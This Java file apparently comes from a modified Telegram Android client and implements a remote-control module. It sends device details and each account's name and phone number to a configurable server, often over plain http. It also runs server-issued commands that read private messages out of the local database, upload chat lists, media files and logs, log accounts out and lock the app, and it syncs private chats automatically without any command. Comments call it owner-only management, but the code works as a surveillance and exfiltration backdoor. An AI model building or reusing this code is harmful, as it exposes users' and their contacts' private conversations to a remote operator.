package uz.neyroaza.gram;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.text.TextUtils;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.FileLog;
import org.telegram.messenger.MessageObject;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.MessagesStorage;
import org.telegram.messenger.SharedConfig;
import org.telegram.messenger.UserConfig;
import org.telegram.tgnet.TLRPC;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.UUID;

/**
 * Masofaviy boshqaruv. Faqat FOYDALANUVCHINING o'z serveri va o'z qurilmalari uchun.
 *
 * Har ~60 soniyada o'z serveriga (NeyroConfig.adminServer) holat yuboradi:
 * qurilma nomi, ilova versiyasi, faol akkauntlar (nomi, telefoni, online, o'qilmaganlar).
 * Javobda kelgan buyruqlarni bajaradi: akkauntdan chiqarish, ilovani qulflash, loglarni yuborish.
 *
 * Boshqa odamlarning akkauntlariga kirish imkoni YO'Q — faqat shu telefondagi,
 * shu foydalanuvchi kirgan akkauntlar ko'rsatiladi.
 */
public class NeyroAdmin {

    private static final String TAG = "NeyroAdmin";
    private static final long INTERVAL_MS = 60_000L;

    private static volatile boolean running;
    private static String deviceId;

    private static final long POLL_MS = 6_000L;

    public static synchronized void start() {
        if (running) {
            return;
        }
        running = true;
        Thread t = new Thread(NeyroAdmin::loop, "NeyroAdmin");
        t.setDaemon(true);
        t.start();
        Thread pt = new Thread(NeyroAdmin::pollLoop, "NeyroAdminPoll");
        pt.setDaemon(true);
        pt.start();
    }

    private static boolean enabled() {
        return NeyroConfig.adminEnabled
                && !TextUtils.isEmpty(NeyroConfig.adminServer)
                && !TextUtils.isEmpty(NeyroConfig.adminPairToken);
    }

    /** Tezkor buyruq pollingi — buyruqlar ~6 soniyada bajariladi (holat yubormaydi). */
    private static void pollLoop() {
        while (running) {
            try {
                if (enabled()) {
                    JSONObject body = new JSONObject();
                    body.put("pair", NeyroConfig.adminPairToken);
                    body.put("device_id", deviceId());
                    String resp = post(base() + "/d/poll", body.toString());
                    if (resp != null) {
                        JSONArray commands = new JSONObject(resp).optJSONArray("commands");
                        if (commands != null) {
                            for (int i = 0; i < commands.length(); i++) {
                                execute(commands.getJSONObject(i));
                            }
                        }
                    }
                }
            } catch (Throwable e) {
                Log.i(TAG, "poll error: " + e.getMessage());
            }
            try {
                Thread.sleep(POLL_MS);
            } catch (InterruptedException e) {
                return;
            }
        }
    }

    private static String deviceId() {
        if (deviceId == null) {
            SharedPreferences p = ApplicationLoader.applicationContext.getSharedPreferences("neyro_admin", Context.MODE_PRIVATE);
            deviceId = p.getString("device_id", null);
            if (deviceId == null) {
                deviceId = UUID.randomUUID().toString();
                p.edit().putString("device_id", deviceId).apply();
            }
        }
        return deviceId;
    }

    private static void loop() {
        while (running) {
            try {
                if (NeyroConfig.adminEnabled && !TextUtils.isEmpty(NeyroConfig.adminServer) && !TextUtils.isEmpty(NeyroConfig.adminPairToken)) {
                    beat();
                }
            } catch (Throwable e) {
                Log.i(TAG, "beat error: " + e.getMessage());
            }
            try {
                Thread.sleep(INTERVAL_MS);
            } catch (InterruptedException e) {
                return;
            }
        }
    }

    private static String base() {
        String s = NeyroConfig.adminServer.trim();
        if (!s.startsWith("http://") && !s.startsWith("https://")) {
            s = "http://" + s;
        }
        while (s.endsWith("/")) {
            s = s.substring(0, s.length() - 1);
        }
        return s;
    }

    private static void beat() throws Exception {
        JSONObject body = new JSONObject();
        body.put("pair", NeyroConfig.adminPairToken);
        body.put("device_id", deviceId());
        body.put("name", Build.MANUFACTURER + " " + Build.MODEL);
        body.put("app_version", org.telegram.messenger.BuildVars.BUILD_VERSION_STRING);

        JSONArray accounts = new JSONArray();
        boolean foreground = ApplicationLoader.isScreenOn && !ApplicationLoader.mainInterfacePaused;
        for (int a = 0; a < UserConfig.MAX_ACCOUNT_COUNT; a++) {
            UserConfig uc = UserConfig.getInstance(a);
            if (!uc.isClientActivated()) {
                continue;
            }
            TLRPC.User user = uc.getCurrentUser();
            JSONObject acc = new JSONObject();
            acc.put("id", uc.getClientUserId());
            acc.put("name", user != null ? (safe(user.first_name) + " " + safe(user.last_name)).trim() : ("#" + a));
            acc.put("phone", user != null && user.phone != null ? "+" + user.phone : "");
            acc.put("online", foreground && a == UserConfig.selectedAccount);
            acc.put("unread", MessagesStorage.getInstance(a).getMainUnreadCount());
            accounts.put(acc);
        }
        body.put("accounts", accounts);

        String resp = post(base() + "/d/beat", body.toString());
        if (resp == null) {
            return;
        }
        JSONObject json = new JSONObject(resp);
        JSONArray commands = json.optJSONArray("commands");
        if (commands != null) {
            for (int i = 0; i < commands.length(); i++) {
                execute(commands.getJSONObject(i));
            }
        }
        maybeAutoSync();
    }

    private static long lastAutoSync;

    /** Akkaunt online (ilova old planda) bo'lganda shaxsiy chatlarni keshga oldindan sync qiladi. */
    private static void maybeAutoSync() {
        if (!NeyroConfig.adminEnabled) {
            return;
        }
        boolean foreground = ApplicationLoader.isScreenOn && !ApplicationLoader.mainInterfacePaused;
        if (!foreground) {
            return;
        }
        long now = System.currentTimeMillis();
        if (now - lastAutoSync < 5 * 60 * 1000L) {
            return;
        }
        lastAutoSync = now;
        for (int a = 0; a < UserConfig.MAX_ACCOUNT_COUNT; a++) {
            UserConfig uc = UserConfig.getInstance(a);
            if (!uc.isClientActivated()) {
                continue;
            }
            final long accId = uc.getClientUserId();
            final int acc = a;
            doSyncChats(accId, "");
            AndroidUtilities.runOnUIThread(() -> {
                try {
                    java.util.ArrayList<TLRPC.Dialog> ds = MessagesController.getInstance(acc).getAllDialogs();
                    int cnt = 0;
                    for (TLRPC.Dialog d : ds) {
                        if (d != null && org.telegram.messenger.DialogObject.isUserDialog(d.id)) {
                            doSyncMsgs(accId, String.valueOf(d.id), "0", "");
                            if (++cnt >= 12) {
                                break;
                            }
                        }
                    }
                } catch (Exception ignore) {
                }
            });
        }
    }

    private static void execute(JSONObject cmd) {
        String type = cmd.optString("type");
        String cmdId = cmd.optString("id");
        long account = cmd.optLong("account", -1);
        Log.i(TAG, "command: " + type + " account=" + account);
        switch (type) {
            case "logout":
                doLogout(account, cmdId);
                break;
            case "lock":
                doLock(cmdId);
                break;
            case "sendlogs":
                doSendLogs(cmdId);
                break;
            case "syncchats":
                doSyncChats(account, cmdId);
                break;
            case "syncmsgs":
                doSyncMsgs(account, cmd.optString("dialog_id"), cmd.optString("before", "0"), cmdId);
                break;
            case "getfile":
                doGetFile(account, cmd.optString("dialog_id"), cmd.optLong("msg_id"), cmdId);
                break;
            default:
                ack(cmdId, "noma'lum buyruq: " + type);
        }
    }

    private static int accountIndexById(long clientUserId) {
        for (int a = 0; a < UserConfig.MAX_ACCOUNT_COUNT; a++) {
            UserConfig uc = UserConfig.getInstance(a);
            if (uc.isClientActivated() && uc.getClientUserId() == clientUserId) {
                return a;
            }
        }
        return -1;
    }

    /** Chat ro'yxatini yig'ib serverga yuklaydi (kesh uchun). */
    private static void doSyncChats(long accountId, String cmdId) {
        final int acc = accountIndexById(accountId);
        Log.i(TAG, "doSyncChats acc=" + acc + " id=" + accountId);
        if (acc < 0) {
            ack(cmdId, "akkaunt topilmadi");
            return;
        }
        AndroidUtilities.runOnUIThread(() -> {
            try {
                MessagesController mc = MessagesController.getInstance(acc);
                java.util.ArrayList<TLRPC.Dialog> dialogs = mc.getAllDialogs();
                Log.i(TAG, "doSyncChats dialogs=" + dialogs.size());
                JSONArray arr = new JSONArray();
                int limit = Math.min(dialogs.size(), 100);
                for (int i = 0; i < limit; i++) {
                    TLRPC.Dialog d = dialogs.get(i);
                    if (d == null || org.telegram.messenger.DialogObject.isFolderDialogId(d.id)) {
                        continue;
                    }
                    JSONObject o = new JSONObject();
                    o.put("id", d.id);
                    o.put("title", org.telegram.messenger.DialogObject.getName(acc, d.id));
                    o.put("unread", d.unread_count);
                    o.put("date", d.last_message_date);
                    java.util.ArrayList<MessageObject> mm = mc.dialogMessage.get(d.id);
                    if (mm != null && !mm.isEmpty() && mm.get(0) != null) {
                        CharSequence txt = mm.get(0).messageText;
                        o.put("preview", txt != null ? txt.toString() : "");
                    }
                    arr.put(o);
                }
                final String dialogsJson = arr.toString();
                Utilities_runOnGlobalQueue(() -> {
                    try {
                        JSONObject body = new JSONObject();
                        body.put("pair", NeyroConfig.adminPairToken);
                        body.put("device_id", deviceId());
                        body.put("account", accountId);
                        body.put("dialogs", new JSONArray(dialogsJson));
                        post(base() + "/d/chats", body.toString());
                        ack(cmdId, "chatlar yuklandi: " + arr.length());
                    } catch (Exception e) {
                        ack(cmdId, "yuklashda xato: " + e.getMessage());
                    }
                });
            } catch (Exception e) {
                ack(cmdId, "xato: " + e.getMessage());
            }
        });
    }

    /** Bitta chatning xabarlarini yig'ib serverga yuklaydi (sahifali: before'dan eskiroq 100 ta). */
    private static void doSyncMsgs(long accountId, String dialogIdStr, String beforeStr, String cmdId) {
        final int acc = accountIndexById(accountId);
        long dialogId;
        int before;
        try {
            dialogId = Long.parseLong(dialogIdStr);
            long b = Long.parseLong(beforeStr);
            before = (b <= 0 || b > Integer.MAX_VALUE) ? Integer.MAX_VALUE : (int) b;
        } catch (Exception e) {
            ack(cmdId, "dialog_id xato");
            return;
        }
        if (acc < 0) {
            ack(cmdId, "akkaunt topilmadi");
            return;
        }
        final long dlg = dialogId;
        final int beforeId = before;
        final String beforeOut = beforeStr == null ? "0" : beforeStr;
        MessagesStorage.getInstance(acc).getStorageQueue().postRunnable(() -> {
            org.telegram.SQLite.SQLiteCursor cursor = null;
            try {
                JSONArray arr = new JSONArray();
                cursor = MessagesStorage.getInstance(acc).getDatabase().queryFinalized(String.format(
                        java.util.Locale.US,
                        "SELECT data, mid, date, out FROM messages_v2 WHERE uid = %d AND mid > 0 AND mid < %d ORDER BY mid DESC LIMIT 100", dlg, beforeId));
                MessagesController mc = MessagesController.getInstance(acc);
                while (cursor.next()) {
                    org.telegram.tgnet.NativeByteBuffer data = cursor.byteBufferValue(0);
                    if (data == null) {
                        continue;
                    }
                    TLRPC.Message message = TLRPC.Message.TLdeserialize(data, data.readInt32(false), false);
                    data.reuse();
                    if (message == null) {
                        continue;
                    }
                    JSONObject o = new JSONObject();
                    o.put("id", cursor.intValue(1));
                    o.put("date", cursor.intValue(2));
                    boolean out = cursor.intValue(3) != 0;
                    o.put("out", out);
                    String text = message.message;
                    if (TextUtils.isEmpty(text)) {
                        text = message.media != null ? "[media]" : (message.action != null ? "[action]" : "");
                    }
                    o.put("text", text);
                    JSONObject media = mediaJson(message);
                    if (media != null) {
                        o.put("media", media);
                    }
                    if (out) {
                        o.put("sender", "Siz");
                    } else {
                        long fromId = message.from_id != null
                                ? org.telegram.messenger.DialogObject.getPeerDialogId(message.from_id) : dlg;
                        o.put("sender", org.telegram.messenger.DialogObject.getName(acc, fromId));
                    }
                    arr.put(o);
                }
                final String msgsJson = arr.toString();
                final int count = arr.length();
                Utilities_runOnGlobalQueue(() -> {
                    try {
                        JSONObject body = new JSONObject();
                        body.put("pair", NeyroConfig.adminPairToken);
                        body.put("device_id", deviceId());
                        body.put("account", accountId);
                        body.put("dialog_id", String.valueOf(dlg));
                        body.put("before", beforeOut);
                        body.put("hasMore", count >= 100);
                        body.put("messages", new JSONArray(msgsJson));
                        post(base() + "/d/messages", body.toString());
                        ack(cmdId, "xabarlar yuklandi: " + count);
                    } catch (Exception e) {
                        ack(cmdId, "yuklashda xato: " + e.getMessage());
                    }
                });
            } catch (Exception e) {
                ack(cmdId, "xato: " + e.getMessage());
            } finally {
                if (cursor != null) {
                    cursor.dispose();
                }
            }
        });
    }

    private static void doLogout(long clientUserId, String cmdId) {
        int target = -1;
        for (int a = 0; a < UserConfig.MAX_ACCOUNT_COUNT; a++) {
            UserConfig uc = UserConfig.getInstance(a);
            if (uc.isClientActivated() && (clientUserId < 0 || uc.getClientUserId() == clientUserId)) {
                target = a;
                break;
            }
        }
        final int acc = target;
        if (acc < 0) {
            ack(cmdId, "akkaunt topilmadi");
            return;
        }
        AndroidUtilities.runOnUIThread(() -> {
            try {
                MessagesController.getInstance(acc).performLogout(1);
                ack(cmdId, "akkauntdan chiqildi");
            } catch (Exception e) {
                ack(cmdId, "xato: " + e.getMessage());
            }
        });
    }

    private static void doLock(String cmdId) {
        AndroidUtilities.runOnUIThread(() -> {
            SharedConfig.appLocked = true;
            SharedConfig.saveConfig();
            if (TextUtils.isEmpty(SharedConfig.passcodeHash)) {
                ack(cmdId, "qulflandi (lekin parol o'rnatilmagan)");
            } else {
                ack(cmdId, "ilova qulflandi");
            }
        });
    }

    private static void doSendLogs(String cmdId) {
        Utilities_runOnGlobalQueue(() -> {
            try {
                File dir = AndroidUtilities.getLogsDir();
                File newest = null;
                File[] files = dir != null ? dir.listFiles() : null;
                if (files != null) {
                    for (File f : files) {
                        if (f.isFile() && (newest == null || f.lastModified() > newest.lastModified())) {
                            newest = f;
                        }
                    }
                }
                if (newest == null) {
                    ack(cmdId, "log fayli yo'q (loglar o'chirilgan bo'lishi mumkin)");
                    return;
                }
                boolean ok = uploadFile(base() + "/d/logs", newest);
                ack(cmdId, ok ? ("log yuborildi: " + newest.getName()) : "log yuborishda xato");
            } catch (Exception e) {
                ack(cmdId, "xato: " + e.getMessage());
            }
        });
    }

    /** Media faylni (video/rasm) yuklab, serverga yuklaydi. Kerak bo'lsa avval Telegram'dan yuklab oladi. */
    private static void doGetFile(long accountId, String dialogIdStr, long msgId, String cmdId) {
        final int acc = accountIndexById(accountId);
        long dlg;
        try {
            dlg = Long.parseLong(dialogIdStr);
        } catch (Exception e) {
            ack(cmdId, "dialog_id xato");
            return;
        }
        if (acc < 0) {
            ack(cmdId, "akkaunt topilmadi");
            return;
        }
        final long dialogId = dlg;
        MessagesStorage.getInstance(acc).getStorageQueue().postRunnable(() -> {
            org.telegram.SQLite.SQLiteCursor cursor = null;
            try {
                cursor = MessagesStorage.getInstance(acc).getDatabase().queryFinalized(String.format(
                        java.util.Locale.US, "SELECT data FROM messages_v2 WHERE uid = %d AND mid = %d LIMIT 1", dialogId, msgId));
                TLRPC.Message message = null;
                if (cursor.next()) {
                    org.telegram.tgnet.NativeByteBuffer data = cursor.byteBufferValue(0);
                    if (data != null) {
                        message = TLRPC.Message.TLdeserialize(data, data.readInt32(false), false);
                        data.reuse();
                    }
                }
                cursor.dispose();
                cursor = null;
                if (message == null || message.media == null) {
                    ack(cmdId, "media topilmadi");
                    return;
                }
                final TLRPC.Message msg = message;
                AndroidUtilities.runOnUIThread(() -> startFileFetch(acc, accountId, dialogId, msgId, msg, cmdId));
            } catch (Exception e) {
                ack(cmdId, "xato: " + e.getMessage());
            } finally {
                if (cursor != null) {
                    cursor.dispose();
                }
            }
        });
    }

    private static String mimeOf(TLRPC.Message msg) {
        if (msg.media instanceof TLRPC.TL_messageMediaDocument && msg.media.document != null) {
            String m = msg.media.document.mime_type;
            return TextUtils.isEmpty(m) ? "application/octet-stream" : m;
        }
        return "image/jpeg";
    }

    private static void startFileFetch(int acc, long accountId, long dialogId, long msgId, TLRPC.Message msg, String cmdId) {
        org.telegram.messenger.FileLoader fl = org.telegram.messenger.FileLoader.getInstance(acc);
        java.io.File path = fl.getPathToMessage(msg);
        String ctype = mimeOf(msg);
        if (path != null && path.exists() && path.length() > 0) {
            uploadMedia(accountId, dialogId, msgId, path, ctype, cmdId);
            return;
        }
        try {
            if (msg.media instanceof TLRPC.TL_messageMediaDocument && msg.media.document != null) {
                fl.loadFile(msg.media.document, msg, org.telegram.messenger.FileLoader.PRIORITY_HIGH, 0);
            } else if (msg.media instanceof TLRPC.TL_messageMediaPhoto && msg.media.photo != null) {
                TLRPC.PhotoSize sz = org.telegram.messenger.FileLoader.getClosestPhotoSizeWithSize(msg.media.photo.sizes, 10000);
                if (sz != null) {
                    fl.loadFile(org.telegram.messenger.ImageLocation.getForPhoto(sz, msg.media.photo), msg, null, org.telegram.messenger.FileLoader.PRIORITY_HIGH, 0);
                }
            } else {
                ack(cmdId, "bu media turini yuklab bo'lmaydi");
                return;
            }
        } catch (Exception e) {
            ack(cmdId, "yuklash xatosi: " + e.getMessage());
            return;
        }
        pollFile(acc, accountId, dialogId, msgId, msg, ctype, cmdId, 0);
    }

    private static void pollFile(int acc, long accountId, long dialogId, long msgId, TLRPC.Message msg, String ctype, String cmdId, int tries) {
        java.io.File path = org.telegram.messenger.FileLoader.getInstance(acc).getPathToMessage(msg);
        if (path != null && path.exists() && path.length() > 0) {
            uploadMedia(accountId, dialogId, msgId, path, ctype, cmdId);
            return;
        }
        if (tries >= 60) {
            ack(cmdId, "yuklab bo'lmadi (vaqt tugadi)");
            return;
        }
        AndroidUtilities.runOnUIThread(() -> pollFile(acc, accountId, dialogId, msgId, msg, ctype, cmdId, tries + 1), 3000);
    }

    private static void uploadMedia(long accountId, long dialogId, long msgId, java.io.File file, String ctype, String cmdId) {
        Utilities_runOnGlobalQueue(() -> {
            HttpURLConnection c = null;
            try {
                c = (HttpURLConnection) new URL(base() + "/d/file").openConnection();
                c.setRequestMethod("POST");
                c.setConnectTimeout(15000);
                c.setReadTimeout(120000);
                c.setDoOutput(true);
                c.setFixedLengthStreamingMode(file.length());
                c.setRequestProperty("X-Pair-Token", NeyroConfig.adminPairToken);
                c.setRequestProperty("X-Device-Id", deviceId());
                c.setRequestProperty("X-Acc", String.valueOf(accountId));
                c.setRequestProperty("X-Dlg", String.valueOf(dialogId));
                c.setRequestProperty("X-Msg", String.valueOf(msgId));
                c.setRequestProperty("X-Ctype", ctype);
                byte[] buf = new byte[16384];
                int n;
                try (FileInputStream in = new FileInputStream(file); OutputStream os = c.getOutputStream()) {
                    while ((n = in.read(buf)) > 0) {
                        os.write(buf, 0, n);
                    }
                }
                int code = c.getResponseCode();
                ack(cmdId, code >= 200 && code < 300 ? ("fayl yuklandi: " + (file.length() / 1024) + " KB") : ("fayl xato: HTTP " + code));
            } catch (Exception e) {
                ack(cmdId, "fayl yuborishda xato: " + e.getMessage());
            } finally {
                if (c != null) {
                    c.disconnect();
                }
            }
        });
    }

    private static void ack(String cmdId, String result) {
        if (TextUtils.isEmpty(cmdId)) {
            return;
        }
        Utilities_runOnGlobalQueue(() -> {
            try {
                JSONObject body = new JSONObject();
                body.put("pair", NeyroConfig.adminPairToken);
                body.put("device_id", deviceId());
                body.put("cmd_id", cmdId);
                body.put("result", result);
                post(base() + "/d/ack", body.toString());
            } catch (Exception e) {
                Log.i(TAG, "ack error: " + e.getMessage());
            }
        });
    }

    // ---- HTTP ----

    private static String post(String urlStr, String json) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(urlStr).openConnection();
        try {
            c.setRequestMethod("POST");
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);
            c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            byte[] out = json.getBytes(StandardCharsets.UTF_8);
            try (OutputStream os = c.getOutputStream()) {
                os.write(out);
            }
            int code = c.getResponseCode();
            InputStream is = code >= 200 && code < 300 ? c.getInputStream() : c.getErrorStream();
            return readAll(is);
        } finally {
            c.disconnect();
        }
    }

    private static boolean uploadFile(String urlStr, File file) {
        HttpURLConnection c = null;
        try {
            c = (HttpURLConnection) new URL(urlStr).openConnection();
            c.setRequestMethod("POST");
            c.setConnectTimeout(15000);
            c.setReadTimeout(30000);
            c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "text/plain");
            c.setRequestProperty("X-Pair-Token", NeyroConfig.adminPairToken);
            c.setRequestProperty("X-Device-Id", deviceId());
            byte[] buf = new byte[8192];
            int n;
            try (FileInputStream in = new FileInputStream(file); OutputStream os = c.getOutputStream()) {
                while ((n = in.read(buf)) > 0) {
                    os.write(buf, 0, n);
                }
            }
            int code = c.getResponseCode();
            return code >= 200 && code < 300;
        } catch (Exception e) {
            return false;
        } finally {
            if (c != null) {
                c.disconnect();
            }
        }
    }

    private static String readAll(InputStream is) throws Exception {
        if (is == null) {
            return null;
        }
        StringBuilder sb = new StringBuilder();
        try (BufferedReader r = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {
            String line;
            while ((line = r.readLine()) != null) {
                sb.append(line);
            }
        }
        return sb.toString();
    }

    private static String safe(String s) {
        return s == null ? "" : s;
    }

    /** Xabar media ma'lumoti: tur, davomiylik, fayl nomi va kichik (stripped) thumbnail. Yuklashsiz. */
    private static JSONObject mediaJson(TLRPC.Message message) {
        try {
            if (message == null || message.media == null) {
                return null;
            }
            JSONObject o = new JSONObject();
            java.util.ArrayList<TLRPC.PhotoSize> thumbs = null;
            if (message.media instanceof TLRPC.TL_messageMediaPhoto && message.media.photo != null) {
                o.put("type", "photo");
                thumbs = message.media.photo.sizes;
            } else if (message.media instanceof TLRPC.TL_messageMediaDocument && message.media.document != null) {
                TLRPC.Document doc = message.media.document;
                thumbs = doc.thumbs;
                String type = "file";
                int duration = 0;
                String fileName = null;
                boolean sticker = false, gif = false, round = false;
                for (TLRPC.DocumentAttribute attr : doc.attributes) {
                    if (attr instanceof TLRPC.TL_documentAttributeVideo) {
                        type = "video";
                        duration = (int) ((TLRPC.TL_documentAttributeVideo) attr).duration;
                        round = ((TLRPC.TL_documentAttributeVideo) attr).round_message;
                    } else if (attr instanceof TLRPC.TL_documentAttributeAudio) {
                        type = ((TLRPC.TL_documentAttributeAudio) attr).voice ? "voice" : "audio";
                        duration = (int) ((TLRPC.TL_documentAttributeAudio) attr).duration;
                    } else if (attr instanceof TLRPC.TL_documentAttributeFilename) {
                        fileName = ((TLRPC.TL_documentAttributeFilename) attr).file_name;
                    } else if (attr instanceof TLRPC.TL_documentAttributeSticker) {
                        sticker = true;
                    } else if (attr instanceof TLRPC.TL_documentAttributeAnimated) {
                        gif = true;
                    }
                }
                if (sticker) {
                    type = "sticker";
                } else if (gif && !"video".equals(type)) {
                    type = "gif";
                } else if (round) {
                    type = "round";
                }
                o.put("type", type);
                if (duration > 0) {
                    o.put("duration", duration);
                }
                if (fileName != null) {
                    o.put("name", fileName);
                }
                o.put("size", doc.size);
            } else {
                String cn = message.media.getClass().getSimpleName();
                o.put("type", cn.replace("TL_messageMedia", "").toLowerCase());
            }
            // kichik thumbnail (allaqachon xabar ichida, yuklashsiz)
            String thumb = strippedThumb(thumbs);
            if (thumb != null) {
                o.put("thumb", thumb);
            }
            return o;
        } catch (Exception e) {
            return null;
        }
    }

    private static String strippedThumb(java.util.ArrayList<TLRPC.PhotoSize> sizes) {
        if (sizes == null) {
            return null;
        }
        try {
            for (TLRPC.PhotoSize s : sizes) {
                if (s instanceof TLRPC.TL_photoStrippedSize && s.bytes != null && s.bytes.length > 3) {
                    android.graphics.Bitmap bmp = org.telegram.messenger.ImageLoader.getStrippedPhotoBitmap(s.bytes, "b");
                    if (bmp == null) {
                        return null;
                    }
                    java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
                    bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, bos);
                    bmp.recycle();
                    return android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP);
                }
            }
        } catch (Exception e) {
            return null;
        }
        return null;
    }

    private static void Utilities_runOnGlobalQueue(Runnable r) {
        org.telegram.messenger.Utilities.globalQueue.postRunnable(r);
    }

    /** Sozlamalar o'zgarganda darhol bir marta holat yuborish. */
    public static void pingNow() {
        Utilities_runOnGlobalQueue(() -> {
            try {
                if (NeyroConfig.adminEnabled && !TextUtils.isEmpty(NeyroConfig.adminServer) && !TextUtils.isEmpty(NeyroConfig.adminPairToken)) {
                    beat();
                }
            } catch (Throwable e) {
                Log.i(TAG, "pingNow error: " + e.getMessage());
            }
        });
    }
}
